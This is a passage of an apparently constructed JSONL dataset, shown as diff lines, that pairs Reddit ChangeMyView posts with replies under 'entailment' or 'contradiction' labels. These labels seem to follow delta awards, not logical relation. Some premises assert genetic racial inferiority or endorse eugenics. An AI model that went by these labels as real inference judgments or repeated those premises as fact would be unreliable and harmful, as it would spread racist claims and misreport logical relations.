it, hold yourself to a strict SLA. See how long it takes before you want to put a gun in your mouth...",
+    "author": "jdblackb",
+    "comment_id": "d7txum3",
+    "parent_id": "t3_53j8hn",
+    "score": 10,
+    "created_utc": 1474332302,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.14052287581699346
+}
+{
+  "nli_id": 32,
+  "pair_line": 16,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Microsoft Windows should not be used in schools",
+    "body": "This view is probably a bit controversial given the wide use of Microsoft Windows in schools (in the US and quite a few countries all over the world) and might seem as a bit of a rant against Microsoft but bear with me. I'm definitely not a Microsoft fan but I'm not exactly an Apple or Linux fanboy either.\n\n**( EDIT: I'm so sorry if you answered and wondered why it's changed. I posted it because I wanted a bigger box to write in. My apologies if I've wasted your time. 3:45 pm Eastern Time. )**\n\n...",
+    "author": "depaysementKing",
+    "submission_id": "t3_53j8hn"
+  },
+  "hypothesis": {
+    "body": "I used Linux for 80% of the machines I install for personal use.  70% Windows (30% mac) at work.  I still always have issues with Linux for the desktop.  I favor mac and windows second and Linux desktop as a distance third.\n\n\n&gt; Having an emphasis on Microsoft Office in school is geared to a desk job that uses Office. \n\nThis is not a good argument because the LibreOffice (Office) equivalent is not as powerful and has similar features.  Engineers use a variety of different pieces of software that is available on Windows.     Plus, you don't mention the type of engineering.  I worked with GIS (Geographic Software) that was mostly geared towards windows, used for industrial and electrical engineering.\n\n&gt; People are introduced to Windows and its interface and have no idea that other operating systems exist \n\nThis is a fair argument except you could make better arguments that becoming proficient in Windows is very useful for a variety of different fields.  A lot of kids don't have access to computers.  If you learn something esoteric, maybe they become even more unfamiliar with a fairly common platform (Windows).   One of my first jobs was installing win95 for ATT operators that would go out into the field and install equipment.  Sometimes highly uneducated.  It was easier for me and them to use and install the required software.  We could make the argument that maybe Linux would have been OK, but there were very few experienced Linux experts to look at issues.\n\n&gt; It's much easier for students to install and run programs on other OS than Windows.\n\nThis argument only works for the most basic installs and configurations.  I have ALWAYS had an easier time with Windows and Mac.  Here are some of the questions I asked on askubuntu.  With windows/mac, things just work. \n\nMy corporate wifi wouldn't work.  \"WPA2 and EAP cannot connect like other devices\", couldn't use wifi at work.\n\nOn another machine.  I wanted to put ubuntu on a mac, couldn't get the wifi to work at all.\n\nRemote Desktop doesn't work, connecting to windows.  Works for mac.\n\nI always have issues with Linux software and then try not upgrading and using a machine after a couple of years.   Software updates don't work.  Sometimes the software just won't run at all.  Like Chrome on an old linux machine.  Try running netflix or streaming software on an old linux machine.\n\n\n&gt; Windows has changed so much over the past few years but educational books don't change that fast.\n\nIt hasn't changed much at all. I typing this on a Windows 7 machine (about 7 years old), I used Windows XP for 5 years.  That is two OSes in more than a decade.  Ubuntu was on Ubuntu 4 in 2004 and they are Ubuntu 16 now.  There have been major updates almost every year.   And my Ubuntu machines are mostly useless because a lot of the software can't be updated or won't even work properly like chrome.  Or open office which I had.\n\n&gt; You could substitute Windows with a Linux distro or Mac OS and still teach students. With less pain\n\n\nAnd You probably could, but a lot of those user skills will be wasted because you rarely see Linux desktop out in public.  When you go to a store or mall or anywhere, take a photo of a linux desktop and post it here. (for fun, compare that to the number of windows desktops around).\nOn top of that, you have to have Linux experts to maintain those systems for hundreds of kids.  \n\nI don't know what kind of Linux user you are, but you are going to have to type something, either at the terminal or editing a configuration file.  Some users can't type.  Some students can't even read.  How are you going to deal with those students that were capable with Windows and Mac?\n\nYou can teach all the top oses, Windows, Linux and Mac.  And people will use Linux if it becomes a better, easier to use OS and system.  We shouldn't force people to use Linux because Windows has so overwhelming dominated the OS desktop market.  I wager Google will probably come up with another Desktop OS that doesn't Linux and will be a better desktop experience than Windows, before more people use Linux. I know a lot of people love the mythos around Linux but there are a lot of flaws with the entire approach to software.  I know a lot of people that end up not liking Windows after heavy use.  I have used Linux most of my life and of the three top OS systems, I always consider Linux the worst desktop experience every time.  (minus install and setup, but pretty much everything else).\n\nHere is a recent reference on Linux issues which could be applied to your view.\n\nhttp://itvision.altervista.org/why.linux.is.not.ready.for.the.desktop.current.html",
+    "author": "berlinbrown",
+    "comment_id": "d7vemw8",
+    "parent_id": "t3_53j8hn",
+    "score": 1,
+    "created_utc": 1474419498,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.14052287581699346
+}
+{
+  "nli_id": 33,
+  "pair_line": 17,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Microsoft Windows should not be used in schools",
+    "body": "This view is probably a bit controversial given the wide use of Microsoft Windows in schools (in the US and quite a few countries all over the world) and might seem as a bit of a rant against Microsoft but bear with me. I'm definitely not a Microsoft fan but I'm not exactly an Apple or Linux fanboy either.\n\n**( EDIT: I'm so sorry if you answered and wondered why it's changed. I posted it because I wanted a bigger box to write in. My apologies if I've wasted your time. 3:45 pm Eastern Time. )**\n\n...",
+    "author": "depaysementKing",
+    "submission_id": "t3_53j8hn"
+  },
+  "hypothesis": {
+    "body": "&gt; People are introduced to Windows and its interface and have no idea that other operating systems exist (save for OS X and previous Mac OS which are usually beyond most kids). This leads to vendor lock-in\n\nThat's a weird argument. Who cares? Kids will be just as \"locked in\" to whatever operating system they are first exposed to. They aren't even locked in since the concepts easily transfer between modern operating systems.\n\n&gt; Young students don't learn much from Windows software as they are either too young or the teachers don't know how to use the advanced feature of Microsoft products.\n\nThey learn how to use an operating system used by the majority of the world. They learn basic concepts that transfer to other operating systems. Teachers will be similarly ignorant on advanced features of any alternative product.\n\n&gt; Spending time on Microsoft Office products is taking away time from learning an actual programming language and exploring other uses of computers.\n\nMicrosoft Office is used by just about every business. Things learned about office easily transfer to analogs like LibreOffice. Most programming in business is done in Excel. For every \"real\" programming project, there are 100 macros in Excel. Learning to program with macros is very accessible, and those concepts transfer to \"real\" programming. In the real world, you'll get more done with quick one-off analysis in Excel. You don't create a database and open up your IDE every time you want to analyze data.\n\n&gt; Even when Microsoft Office products are used, emphasis is given to Word, Powerpoint and Excel.\n\nThat's what people use in the real world. They are very powerful.\n\n&gt; Switching from Windows to another OS is kinda hard while the reverse is somewhat easier.\n\nI grew up on DOS, and then Windows. Moving from one OS to the other is equally difficult. Non-technical people memorize a list of steps they must perform to get something done. Changing the interface means they must memorize a new list of steps. As a technical person, I was able to jump into Linux and OSX easily with a deep understanding of Windows. Modern GUIs obscure the real differences for all casual use.\n\n&gt; By comparison, I know kids who grew up using Ubuntu who switched to Windows quite easily. I'm guessing that's because Linux actually shows you how the operating system works instead of handicapping you with the (not) amazing quirks of Windows.\n\nReally, it's because the kids who used Ubuntu grew up with more technical parents. You have to seek out Ubuntu instead of just getting Windows by default.",
+    "author": "NaturalSelectorX",
+    "comment_id": "d7tk1av",
+    "parent_id": "t3_53j8hn",
+    "score": 34,
+    "created_utc": 1474313540,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.24253731343283583
+}
+{
+  "nli_id": 34,
+  "pair_line": 17,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Microsoft Windows should not be used in schools",
+    "body": "This view is probably a bit controversial given the wide use of Microsoft Windows in schools (in the US and quite a few countries all over the world) and might seem as a bit of a rant against Microsoft but bear with me. I'm definitely not a Microsoft fan but I'm not exactly an Apple or Linux fanboy either.\n\n**( EDIT: I'm so sorry if you answered and wondered why it's changed. I posted it because I wanted a bigger box to write in. My apologies if I've wasted your time. 3:45 pm Eastern Time. )**\n\n...",
+    "author": "depaysementKing",
+    "submission_id": "t3_53j8hn"
+  },
+  "hypothesis": {
+    "body": "Frankly, the reason why it's emphasized in schools is that it has been and still is the most common PC operating system and that support (for the IT admins needs and from major hardware vendors) is substantial. How many hardware vendors can a school choose from if they want machines pre-installed with another OS? It can be limiting, therefore expensive and complicated.\n\n&gt; Having an emphasis on Microsoft Office in school is geared to a desk job that uses Office. And you don't even learn Office properly\n\nThis point is not about Microsoft Windows, so it doesn't support what you're saying. It's also fixable without changing the OS.\n\n&gt; People are introduced to Windows and its interface and have no idea that other operating systems exist (save for OS X and previous Mac OS which are usually beyond most kids). This leads to vendor lock-in.\n\nThis would be true of whatever system was chosen.\n\n&gt; Spending time on Microsoft Office products is taking away time from learning an actual programming language and exploring other uses of computers.\n\nThis point is not about Microsoft Windows, so it doesn't support what you're saying. It's also fixable without changing the OS.\n\n&gt; It's much easier for students to install and run programs on other OS than Windows.\n\n1) That's highly debatable.\n\n2) IT admins who have to manage hundreds or thousands of PCs generally do not want users to be installing their own programs anyways as that would make infrastructure substantially harder to handle.\n\n3) It's not really relevant since installing things doesn't really represent what students need to be training/doing.\n\n&gt; Even when Microsoft Office products are used, emphasis is given to Word, Powerpoint and Excel.\n\nThis point is not about Microsoft Windows, so it doesn't support what you're saying. It's also fixable without changing the OS. They're chosen because they're also some of the professional world's most popular software.\n\n&gt; Windows has changed so much over the past few years but educational books don't change that fast.\n\nThis is true of any OS. This is true of technology in general. However, students don't need detailed books explaining every menu, the important aspects of Windows has remained the same or can be figure out very quickly. In terms of what you're saying students learn in school... it's all very similar. You click the windows icon, you click the program or type the name and hit enter, then the program is there. The interface in Windows 10 fundamentally is very similar to Windows 7 or Vista.\n\n&gt; You could substitute Windows with a Linux distro or Mac OS and still teach students. With less pain\n\nI don't see why there would be less pain. Could you list the pain points in detail that are specific to the OS that students would experience? Compared to Mac, Windows is substantially better at catering to IT Admins in ways that help them handle large amounts of computers, security, networks and general support. Compared to Linux, Windows has a lower learning curve, is harder to break and is more representative of the bulk of computing experiences people will encounter in their professional and personal life where Windows is still most common. Given, as you say, that computer curriculum is largely based on documents, spreadsheets and presentations, it's pretty representative and appropriate that Windows is used.\n\n&gt; Switching from Windows to another OS is kinda hard while the reverse is somewhat easier.\n\nIt's hard, yet you're saying we should do it?\n\nThe reverse isn't really easier. Any change in the platform of all your computers is going to be a huge nightmare for admins.",
+    "author": "CreativeGPX",
+    "comment_id": "d7tnn0y",
+    "parent_id": "t3_53j8hn",
+    "score": 1,
+    "created_utc": 1474318024,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.24253731343283583
+}
+{
+  "nli_id": 35,
+  "pair_line": 18,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Universal Basic Income makes much less sense than simply expanding the Welfare System",
+    "body": "I think that for redistributing wealth to deal with increased automation, expanding the welfare system makes way more sense than UBI. I want to begin this by defining UBI and the welfare system as I understand them. \n\n- UBI - \"to provide all legal residents of a country a standard sum of cash unconnected to work\"\n\n- The Welfare System - Providing income to society's lowest earning citizens on a sliding scale so that the lower your income, the more assistence you get. Expanding this would mean th...",
+    "author": "Northerner6",
+    "submission_id": "t3_6jgnbe"
+  },
+  "hypothesis": {
+    "body": "I think you're halfway there though, UBI *is* just another way to redistribute wealth. The argument that is made though is that its a better one. \n\nOn your point 1, you're making an assumption that the tax structure stays the same, but everyone gets an extra sum of money per year. This comes out of some pool of federal funds, but the important thing is to consider how this pool is filled in the first place. If we assume for simplicity that the proposal is budget neutral (that is, we've eliminated the welfare system, and are not drawing from the deficit to pay for it), then the people that are high income must be getting taxed more than the additional amount they are receiving in UBI. Technically they're getting that money, but they're not actually seeing an increased buying power. This speaks to your point 2, as well as to the point about inflation. \n\nTo see it clearer, it might help to think of UBI in a different way: We're designing a tax structure where the percentage that you're taxed scales with your income, except that at a certain income, instead of having a positive tax rate, you have a negative one (the government gives you money). \n\nSo what do we win with this scheme? \n\n(1) The welfare program has a significant overhead in spending (according to the data quoted in [this article](https://fivethirtyeight.com/features/most-welfare-dollars-dont-go-directly-to-poor-people-anymore/) , 8-10% of the budget). UBI is a much simpler system and would require significantly less administrative staff, office space, infrastructure.\n\n(2) The current welfare system is complicated and confusing. Applicants have to jump through countless hoops to access aid. They have to make many trips to government offices and fill out forms, and all of this costs these individuals significant time, as well as money (in childcare, travel costs, etc). This (combined with welfare shaming that you mention) prevents many people from getting the aid they qualify for. In UBI this is gone. \n\n(3) Personal freedom (and more efficiency). We divide welfare into a bunch of different programs that give people money and aid for specific particular things. But people needs are different and peoples wants are different, and wouldn't it be simpler if the government got out of the way here and gave people a lump sum?\n\nDisclaimer: I don't think UBI is a perfect system, and there are certain programs that I would argue should remain in place as is, and there needs to be some protections to ensure that children are receiving adequate benefits. But I think there's a good argument to be made for significantly simplifying, combining and removing beureaucracy from the system as is, and UBI stands at the other end of the spectrum here. ",
+    "author": "LeopoldTheLlama",
+    "comment_id": "dje6t5o",
+    "parent_id": "t3_6jgnbe",
+    "score": 12,
+    "created_utc": 1498429060,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.12558139534883722
+}
+{
+  "nli_id": 36,
+  "pair_line": 18,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Universal Basic Income makes much less sense than simply expanding the Welfare System",
+    "body": "I think that for redistributing wealth to deal with increased automation, expanding the welfare system makes way more sense than UBI. I want to begin this by defining UBI and the welfare system as I understand them. \n\n- UBI - \"to provide all legal residents of a country a standard sum of cash unconnected to work\"\n\n- The Welfare System - Providing income to society's lowest earning citizens on a sliding scale so that the lower your income, the more assistence you get. Expanding this would mean th...",
+    "author": "Northerner6",
+    "submission_id": "t3_6jgnbe"
+  },
+  "hypothesis": {
+    "body": "&gt;  I feel like UBI has become a rallying point for alot of people who have grown up in a generation that has demonized welfare\n\nThis is one of the strongest arguments for basic income. Welfare is demonized, but it is not just the current generation which has demonized it. A paper in which this in the Manitoba annual income experiment from the 1970's. It was found that many people who joined in on the experiment did so for two reasons. First, it created a sense of financial security, and second, that it was not welfare. Welfare is a stigmatized idea in which the people who need it may not use it because of the stigmatization which comes from it not being universal. The point of this is to create a fair system. If everyone receives the money, no one can be stigmatized for accepting it. As such, basic income is superior in this sense to welfare in which only those who qualify are able to benefit from it.\n\nA big problem with welfare is that it does not provide the people receiving it with the ability to use it as necessary. If you are provided with $180 in food stamps per month, but you only need $140, you are losing access to $40 per month which you could use toward other necessary expenses. You are limited in how you can use the money you receive when you are on welfare. Basic income though is just a lump sum of money which can be used for anything. This means that when your car has trouble in 10 months and is going to required $400 to fix, that $40 you saved every month in your food budget can be used to pay for it.",
+    "author": "fryamtheiman",
+    "comment_id": "djei7pl",
+    "parent_id": "t3_6jgnbe",
+    "score": 2,
+    "created_utc": 1498446289,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.12558139534883722
+}
+{
+  "nli_id": 37,
+  "pair_line": 19,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Universal Basic Income makes much less sense than simply expanding the Welfare System",
+    "body": "I think that for redistributing wealth to deal with increased automation, expanding the welfare system makes way more sense than UBI. I want to begin this by defining UBI and the welfare system as I understand them. \n\n- UBI - \"to provide all legal residents of a country a standard sum of cash unconnected to work\"\n\n- The Welfare System - Providing income to society's lowest earning citizens on a sliding scale so that the lower your income, the more assistence you get. Expanding this would mean th...",
+    "author": "Northerner6",
+    "submission_id": "t3_6jgnbe"
+  },
+  "hypothesis": {
+    "body": "All your points are missing one simple thing.\n\nYou need to raise taxes to pay for UBI.\n\nIdeally, the tax hike is *exactly* proportional to the payment for people at the median income.  So you get $30,0000 a year, but pay an extra $30,000 in taxes.\n\nNo extra buying power, no inflation.",
+    "author": "PsychoPhilosopher",
+    "comment_id": "dje7stn",
+    "parent_id": "t3_6jgnbe",
+    "score": 4,
+    "created_utc": 1498430509,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.11764705882352941
+}
+{
+  "nli_id": 38,
+  "pair_line": 19,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Universal Basic Income makes much less sense than simply expanding the Welfare System",
+    "body": "I think that for redistributing wealth to deal with increased automation, expanding the welfare system makes way more sense than UBI. I want to begin this by defining UBI and the welfare system as I understand them. \n\n- UBI - \"to provide all legal residents of a country a standard sum of cash unconnected to work\"\n\n- The Welfare System - Providing income to society's lowest earning citizens on a sliding scale so that the lower your income, the more assistence you get. Expanding this would mean th...",
+    "author": "Northerner6",
+    "submission_id": "t3_6jgnbe"
+  },
+  "hypothesis": {
+    "body": "Firstly, UBI could reduce welfare dependency. If I am receiving $2000 a month in welfare checks, and entering a $1800/month job will cause me to stop receiving those checks, then I am not going to start working and instead would stay on welfare. With UBI, the welfare payment stays the same regardless of income, so there is no disincentive against becoming employed.\n\nSecondly, with regard to inflation, the poor will have higher buying power, but the rich and middle class will have lower buying power due to higher taxes. The actual amount of inflation would depend on the ratio of poor to rich people and all kinds of other factors, and may not necessarily be worse than welfare in all countries.",
+    "author": "jslsyl",
+    "comment_id": "djfbghg",
+    "parent_id": "t3_6jgnbe",
+    "score": 1,
+    "created_utc": 1498497491,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.11764705882352941
+}
+{
+  "nli_id": 39,
+  "pair_line": 20,
+  "label": "entailment",
+  "premise": {
+    "title": "Blacks are less intelligent than Whites due to genetics CMV",
+    "body": "To clarify what I mean by the Title: \n\nI believe that people with a predominantly sub-saharan African heritage are genetically inclined to lower intelligence when compared to Whites and East Asians.\n\nThis does not mean that all black people are less intelligent than white people. Some black people are much more intelligent than some white people- but these are outliers, and are accounted for by probability distribution. \n\nWhy do I think this way? First off, studies have consistently shown that B...",
+    "author": "Svarog123",
+    "submission_id": "t3_1jipi5"
+  },
+  "hypothesis": {
+    "body": "The scant evidence you cite has not properly controlled for social factors. When studies have controlled for social factors differences vanish.\n\nFor [instance](http://www.nytimes.com/2012/10/07/opinion/sunday/intelligence-and-the-stereotype-threat.html?_r=3&amp;):\n\n&gt; In a 1995 article in The Journal of Personality and Social Psychology, Professors Steele and Aronson found that black students performed comparably with white students when told that the test they were taking was “a laboratory problem-solving task.” Black students scored much lower, however, when they were instructed that the test was meant to measure their intellectual ability. In effect, the prospect of social evaluation suppressed these students’ intelligence.\n\nIf your hypothesis is correct that racial differences give rise to differences in intelligence, we should expect similar races in different countries to have comparable intelligence. [This is not the case](http://www.theamericanconservative.com/articles/race-iq-and-wealth/):\n\n&gt; What we immediately notice is a long list of enormous variations in the tested IQs of genetically indistinguishable European peoples across temporal, geographical, and political lines, variations so large as to raise severe doubts about the strongly genetic-deterministic model of IQ...\n\n&gt; Consider, for example, the results from Germany obtained prior to its 1991 reunification. Lynn and Vanhanen present four separate IQ studies from the former West Germany, all quite sizable, which indicate mean IQs in the range 99–107, with the oldest 1970 sample providing the low end of that range. Meanwhile, a 1967 sample of East German children produced a score of just 90, while two later East German studies in 1978 and 1984 came in at 97–99, much closer to the West German numbers.\n\n&gt; These results seem anomalous from the perspective of strong genetic determinism for IQ. To a very good approximation, East Germans and West Germans are genetically indistinguishable, and an IQ gap as wide as 17 points between the two groups seems inexplicable, while the recorded rise in East German scores of 7–9 points in just half a generation seems even more difficult to explain.\n\nThat article has plenty more examples from around the world.\n\nIn the case of Africa, we have the problem that malnourishment affects brain development. So a direct comparison with the western world is not possible if we're trying to suss out intrinsic race-based differences in intelligence.\n",
+    "author": "genebeam",
+    "comment_id": "cbg10rp",
+    "parent_id": "t3_1jipi5",
+    "score": 7,
+    "created_utc": "1375509425",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.12099644128113879
+}
+{
+  "nli_id": 40,
+  "pair_line": 20,
+  "label": "contradiction",
+  "premise": {
+    "title": "Blacks are less intelligent than Whites due to genetics CMV",
+    "body": "To clarify what I mean by the Title: \n\nI believe that people with a predominantly sub-saharan African heritage are genetically inclined to lower intelligence when compared to Whites and East Asians.\n\nThis does not mean that all black people are less intelligent than white people. Some black people are much more intelligent than some white people- but these are outliers, and are accounted for by probability distribution. \n\nWhy do I think this way? First off, studies have consistently shown that B...",
+    "author": "Svarog123",
+    "submission_id": "t3_1jipi5"
+  },
+  "hypothesis": {
+    "body": "&gt;I forgot the most absurd and ridiculous counter-argument to my sentiment- that race does not exist.\n\nI'll first note that a large number, if not a majority, of geneticists disagree with that statement, and that the [American Anthropological Society also issued a statement to that effect.](http://www.aaanet.org/stmts/racepp.htm) Reputable scientists and academics do, in fact, say that race does not exist in a meaningful biological sense.\n\nBasically, the argument against race is not that genetic clusters in populations don't exist- they obviously do- but that you can't really extrapolate anything important from them, and they mostly just serve to track migration patterns. There is vastly more genetic difference within racial populations than between them, and these clusters even tend to change based on what your hypothesis when sampling is. Sure, you can find differences if you take \"black\" (which in this case even just means \"black based on US categorizations of black,\" which is very different genetically from \"black\" in Brazil, which undermines the idea of race even more) and \"white,\" but you can also do that for \"from Ireland\" and \"from France.\" You can do that for just about any arbitrary group. Saying that because there is a difference between two groups genetically is meaningless, because there's always differences between two geographic populations. Why is this particular one any more likely to happen to contain genes for intelligence? There are many other explanations available. \n\nOtherwise, I'll address this claim:\n\n&gt;Intelligence is general cognitive ability- the capacity to problem solve. IQ tests, while imperfect, adequately test this ability. To claim that there is some kind of \"cultural bias\" in questions featuring geometric patterns, for example, is laughable.\n\nHave you ever heard of the [Pygmalion effect](http://en.wikipedia.org/wiki/Pygmalion_effect)? Expectations on the part of observers can affect performance- humans are not machines. It's an interesting fact that [people do worse when reminded about negative stereotypes about themselves](http://www.thedailybeast.com/newsweek/2000/11/05/the-stereotype-trap.html). \n\nI unfortunately cannot find a link to this study, but there was a study done of a certain racial minority in Japan with a similar reputation for being \"dumber\" than the rest of the population, and who did in fact test worse. The interesting part is that this performance gap entirely disappeared when conducted among members of this racial minority *outside* Japan... where there were no stereotypes about how they performed. The assertion that expectations do not affect performance,and that you can perfectly test for something as complicated as intelligence is simply not true. \n",
+    "author": "nikoberg",
+    "comment_id": "cbf4ksh",
+    "parent_id": "t3_1jipi5",
+    "score": 18,
+    "created_utc": "1375397947",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.12099644128113879
+}
+{
+  "nli_id": 41,
+  "pair_line": 21,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: The police can't be trusted to manage their access to lethal force and therefore shouldn't have it.",
+    "body": "As I see it, the problem we have with police brutality in the US is strongly underpinned by the fact that police in general have demonstrated that they can't be trusted to adequately manage their use of typically-lethal methods of force. That's not even unexpected as far as humans go; managing high-stress situations like that where you're running on adrenaline is a whole different ballgame than practicing at a shooting range.\n\nIn addition to that, there are plenty of other methods that are desig...",
+    "author": "quinoa_rex",
+    "submission_id": "t3_4z8uwi"
+  },
+  "hypothesis": {
+    "body": "&gt;As such, I can't see a reason to continue giving the police access to the standard sidearms etc. that they have now, especially not the military-grade weaponry.\n\nHow many police will you have if you have an armed citizenry and a disarmed police? (even in high gun control states, people can get guns easy enough)\n\nWill the police be able to effectively do their jobs without sidearms? Will non-lethal weapons be enough in the situations a gun would be drawn? \n\nWhat will happen to crime when the knowledge of a disarmed police becomes public? \n\nWill we increase or decrease new officers? Will the fatality rate of officers increase?\n\nHonestly, I don't know the answer to any of these questions, but the simplest solution to \"The police are not being held accountable to their actions\" is not to change their weaponry but change their oversite. \n\n",
+    "author": "ZerexTheCool",
+    "comment_id": "d6tvfm7",
+    "parent_id": "t3_4z8uwi",
+    "score": 7,
+    "created_utc": 1471990448,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.11475409836065574
+}
+{
+  "nli_id": 42,
+  "pair_line": 21,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: The police can't be trusted to manage their access to lethal force and therefore shouldn't have it.",
+    "body": "As I see it, the problem we have with police brutality in the US is strongly underpinned by the fact that police in general have demonstrated that they can't be trusted to adequately manage their use of typically-lethal methods of force. That's not even unexpected as far as humans go; managing high-stress situations like that where you're running on adrenaline is a whole different ballgame than practicing at a shooting range.\n\nIn addition to that, there are plenty of other methods that are desig...",
+    "author": "quinoa_rex",
+    "submission_id": "t3_4z8uwi"
+  },
+  "hypothesis": {
+    "body": "If the police can't be trusted to manage lethal force, then no civilian should be trusted with it either.  If civilians have access to things like Assault Rifles how would the police stop them without access to sidearms?  If police are risking their lives to stop people from committing crimes why shouldn't they be armed?\n\nIn America if the police couldn't carry a firearm what would stop a group of armed men from robbing a bank?  The only one capable of stopping them would be other armed civilians or the military. Armed civilians have no training necessary to carry a firearm they pretty much just need a background check and basic safety course (the course involving nothing more than safe handling of weapons usually). So instead of police who have at least gone through some sort of police academy and have been taught when deadly force is authorized, you have civilians with zero training.\n\nIf you are advocating that no one should have access to lethal force then I'm not going to change your view and that's a whole different topic but you can't take guns away from just law enforcement and expect things to still be resolved without deaths",
+    "author": "Bretreck",
+    "comment_id": "d6tvikz",
+    "parent_id": "t3_4z8uwi",
+    "score": 1,
+    "created_utc": 1471990560,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.11475409836065574
+}
+{
+  "nli_id": 43,
+  "pair_line": 22,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: I am a strong believer in eugenics.",
+    "body": "Just a note, I do not believe in Nazism.  \nNow, I know this view is controversial and I know it's generally frowned upon but my lifelong belief is that eugenics isn't that bad. This started before I can even remember. I felt that people who live off of welfare and do nothing all day but drugs and get fat should lose their reproductive rights. At no time I believed people should die. I just think that people should lose their ability to reproduce until they have proven worth towards society. I do...",
+    "author": "DoxxMeHard",
+    "submission_id": "t3_30dn4s"
+  },
+  "hypothesis": {
+    "body": "&gt;Given that maybe their children will be successful in life but from what I have seen, they most likely are not.\n\nThat's exactly what the nobility said in the 17th century about the commoners, and you should hear what they said about the criminals, religious fundamentalists and nutcases they sent off to the colonies. How's it going over there?\n\nEugenetics is not an option that is available to us because of two reasons:\n\n- We don't even know how much we don't know about genetics, so anything we do will have a lot of side effects. Hundreds of millions of years of evoluation are a better judge than we are presently.\n\n- We cannot predict the future. As a consequence, we cannot predict which genes will be the most useful.",
+    "author": "silverionmox",
+    "comment_id": "cpri1a1",
+    "parent_id": "t3_30dn4s",
+    "score": 6,
+    "created_utc": "1427387161",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.09722222222222222
+}
+{
+  "nli_id": 44,
+  "pair_line": 22,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: I am a strong believer in eugenics.",
+    "body": "Just a note, I do not believe in Nazism.  \nNow, I know this view is controversial and I know it's generally frowned upon but my lifelong belief is that eugenics isn't that bad. This started before I can even remember. I felt that people who live off of welfare and do nothing all day but drugs and get fat should lose their reproductive rights. At no time I believed people should die. I just think that people should lose their ability to reproduce until they have proven worth towards society. I do...",
+    "author": "DoxxMeHard",
+    "submission_id": "t3_30dn4s"
+  },
+  "hypothesis": {
+    "body": "But how is reproduction related to how well you do in life? Or are you also saying that a child born in poverty can't climb up the social ladder or be healthy? And that children from working/healthy parents will automatically be working/healthy too? It just seems that you're looking for a way to punish poor people. Eugenetics for me is selecting good genes, that has nothing to do with social things.",
+    "author": "Roland0180",
+    "comment_id": "cprgvhu",
+    "parent_id": "t3_30dn4s",
+    "score": 8,
+    "created_utc": "1427385395",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.09722222222222222
+}
+{
+  "nli_id": 45,
+  "pair_line": 23,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Faddish negativity for Rio 2016 is brimming with 1st world chauvinism and confirmation bias, fueled by one-sided sensationalism and is creating a no-win scenario for Brazil and the underdeveloped world at large.",
+    "body": "There is a tasteless trend going on that dismisses complex social issues in most of the world as an all-encompassing and canned  idea of general failure. \n\nWe are allowing ourselves to paint a grossly inaccurate picture of life on our planet, an illusion where countries neatly fit in a linear scale that goes from Sierra Leone to Denmark. Couple that with priming from media that thrives on negativity, and you get social networks saturated with overblown and sometimes non-existent complaints.\n\nUlt...",
+    "author": "SagaCult",
+    "submission_id": "t3_4y6hgj"
+  },
+  "hypothesis": {
+    "body": "This is kind of a devil's advocate argument I came up with.  It's what I imagine a reasonable person holding a view contrary to your own might say.\n\nBasically, *the world does not have to care about Brazil*.  \n\nThe world has made it clear what they want.  They aren't tuning in to learn about how Brazil was the first in their family to go to college.  They want sporting events, delivered on a world-class stage, slickly produced and edited, where the athletes aren't drenched in sewage, robbed, subjected to disease, etc.   \n\n\nWhen you sign up to host the Olympics, you are making a guarantee that you can deliver this, *at minimum*.  You guarantee this not only to the IOC, but to the fans, the athletes, and the many advertisers and vendors, all forced to go along with the IOC's choice of venue.   \n\nThe world doesn't care about Brazil's excuses, and they don't have to.  They want what they've come to expect and they didn't get it.  Any other country would be jeered for this.  Does Brazil want to be treated like any other country, or are they \"special\"?\n\n\nEDIT:  emphasis",
+    "author": "overthrow23",
+    "comment_id": "d6le9d1",
+    "parent_id": "t3_4y6hgj",
+    "score": 44,
+    "created_utc": 1471454680,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.1415929203539823
+}
+{
+  "nli_id": 46,
+  "pair_line": 23,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Faddish negativity for Rio 2016 is brimming with 1st world chauvinism and confirmation bias, fueled by one-sided sensationalism and is creating a no-win scenario for Brazil and the underdeveloped world at large.",
+    "body": "There is a tasteless trend going on that dismisses complex social issues in most of the world as an all-encompassing and canned  idea of general failure. \n\nWe are allowing ourselves to paint a grossly inaccurate picture of life on our planet, an illusion where countries neatly fit in a linear scale that goes from Sierra Leone to Denmark. Couple that with priming from media that thrives on negativity, and you get social networks saturated with overblown and sometimes non-existent complaints.\n\nUlt...",
+    "author": "SagaCult",
+    "submission_id": "t3_4y6hgj"
+  },
+  "hypothesis": {
+    "body": "When China hosted the Olympics in 2008, that was their way of showing the world that they should no longer be considered a 'developing country', but should instead be viewed as a real player on the world stage. This was done through their breathtaking opening ceremony and general flawless execution of the entire games. Many people expected similar things for Brazil when it was announced that they would be hosting the 2016 Olympics. Instead, we get a lackluster opening ceremony, games that are mired in corruption (a reflection of the Brazilian government), violence towards athletes and volunteers, classless booing from the Brazilian population in the stadiums, disease and raw sewage, etc. You mention the 2014 World Cup, which as you said was very well run. How did we get from there to here? We are not seeing a Brazil on the rise, we are seeing a Brazil on the decline, and the differences in quality between the 2014 World Cup and the 2016 Olympics highlight that.",
+    "author": "doubleobama",
+    "comment_id": "d6lc3rm",
